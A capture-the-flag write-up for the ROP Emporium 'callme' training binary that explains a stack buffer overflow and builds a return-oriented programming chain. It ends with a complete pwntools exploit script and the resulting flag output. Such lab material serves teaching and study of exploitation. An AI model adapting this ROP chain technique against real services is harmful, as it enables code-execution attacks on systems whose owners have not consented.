# callme

Reliably make consecutive calls to imported functions.
Use some new techniques and learn about the Procedure Linkage Table.

## Writeup

We can check if the binary is stripped or not:

```
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
```

The binary is now stripped we can see function names.

Now check which checks are enabled in this binary:

```
[*] '/home/kali/ROP Emporium/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is not executable, so we can't inject a shellcode.

The program in the **main** function call the function **pwnme**:

```c
void pwnme(void)
{
  undefined buffer [32];
  
  memset(buffer,0,32);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,buffer,512);
  puts("Thank you!");
  return;
}
```

This function insert **512 bytes** of user input into **32 bytes** of buffer.

The binary also has a function called **usefulFunction**:

```c
void usefulFunction(void)
{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

The function call **callme functions** that are inside the **callme.so**.

If we call all this functions in order with correct arguments this functions will **decrypt** the **flag**.

All functions need the same arguments, that are:

```c
void callme_one(long param_1,long param_2,long param_3)
{
  FILE *__stream;
  
  if (((param_1 != L'\xdeadbeef') || (param_2 != L'\xcafebabe')) || (param_3 != L'\xd00df00d')) {
    puts("Incorrect parameters");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __stream = fopen("encrypted_flag.dat","r");
  if (__stream == (FILE *)0x0) {
    puts("Failed to open encrypted_flag.dat");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  g_buf = (char *)malloc(0x21);
  if (g_buf == (char *)0x0) {
    puts("Could not allocate memory");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  g_buf = fgets(g_buf,0x21,__stream);
  fclose(__stream);
  puts("callme_one() called correctly");
  return;
}
```

So we need to pass this three arguments:

```
0xdeadbeefdeadbeef
0xcafebabecafebabe
0xd00df00dd00df00d
```

In the binary we can find an **useful gadget** that make **pop rdi**, **pop rsi**, **pop rdx**, **ret** in order (we can see it with **ROPgadget**):

```
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

Calling all the function correctly will decrypt the flag and print it.

So we can build our payload like this:

```python
callme_one = exe.symbols['callme_one']
callme_two = exe.symbols['callme_two']
callme_three = exe.symbols['callme_three']

buffer_dim = 32
offset = buffer_dim + 8

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
useful_gadget = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]

deadbeef_str = p64(0xdeadbeefdeadbeef)
cafebabe_str = p64(0xcafebabecafebabe)
d00df00d_str = p64(0xd00df00dd00df00d)

payload = [
    b'a' * offset,
    p64(ret),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_one),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_two),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_three),
]
```

The final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak callme_one
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

callme_one = exe.symbols['callme_one']
callme_two = exe.symbols['callme_two']
callme_three = exe.symbols['callme_three']

buffer_dim = 32
offset = buffer_dim + 8

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
useful_gadget = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]

deadbeef_str = p64(0xdeadbeefdeadbeef)
cafebabe_str = p64(0xcafebabecafebabe)
d00df00d_str = p64(0xd00df00dd00df00d)

payload = [
    b'a' * offset,
    p64(ret),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_one),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_two),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_three),
]

payload = b''.join(payload)

io.sendlineafter(b'', payload)

io.interactive()
```

The output will be:

```
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```